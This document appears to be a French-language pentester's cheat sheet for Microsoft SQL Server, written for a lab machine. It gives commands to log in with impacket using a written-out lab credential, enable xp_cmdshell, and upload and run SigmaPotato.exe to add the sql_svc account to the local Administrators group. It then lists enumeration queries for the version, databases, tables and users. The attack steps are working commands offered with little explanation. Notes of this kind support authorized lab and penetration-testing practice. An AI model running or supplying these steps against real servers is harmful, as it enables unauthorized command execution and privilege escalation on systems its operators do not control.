### Connexion
```SHELL
$ impacket-mssqlclient Administrator:Lab123@192.168.167.18 -windows-auth

```
# Enabling xp_cmdshell for SQL Server 2005

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

# execute shell command :
```
EXEC xp_cmdshell 'C:\Users\Public\SigmaPotato.exe "net localgroup Administrators sql_svc /add"';
```

# téléchargement d'un programme de Kali vers la cible
```
upload SigmaPotato.exe c:\Users\Public\SigmaPotato.exe
```
Attention à bien mettre le nom du logiciel (ici SigmaPotato.exe) dans le chemin de copie et surtout, ne pas changer le nom sinon, çà ne marche pas.

### Version
```SQL
select @@version;

```

### Liste des bases de données
```SQL
select name from sys.databases;

```

### Liste des tables d'une base de données
```SQL
SELECT * FROM   INFORMATION_SCHEMA.COLUMNS WHERE Table_Name='NomDeLaTable';

```
### Liste des utilisateurs système
```SQL
select * from sys.sysusers;

```
### Liste de toutes les tables d'une base de donnée
```SQL
SELECT TABLE_NAME FROM   INFORMATION_SCHEMA.TABLES WHERE Table_Type='BASE TABLE';

```

